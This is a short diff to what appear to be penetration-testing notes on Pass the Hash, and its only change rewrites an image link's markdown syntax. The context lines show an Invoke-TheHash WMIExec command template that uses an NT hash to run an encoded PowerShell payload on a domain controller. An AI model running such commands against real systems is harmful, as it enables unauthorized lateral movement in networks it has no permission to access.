@@ -31,7 +31,7 @@ VERBOSE: Service EGDKNNLQVOLFHRQTQMAU deleted on 172.16.1.10
 Import-Module ./Invoke-TheHash.psd1
 Invoke-WMIExec -Target <machine (DC01)> -Domain <DOMAIN> -Username <user> -Hash <NT_hash> -Command "powershell -e <base64 payload>" 
 ```
-![[../../assets/Pass the Hash (PtH)/image 244.png|image 244.png]]
+![image 244.png](../../assets/Pass%20the%20Hash%20(PtH)/image%20244.png)
   
   
 # Impacket (Linux)
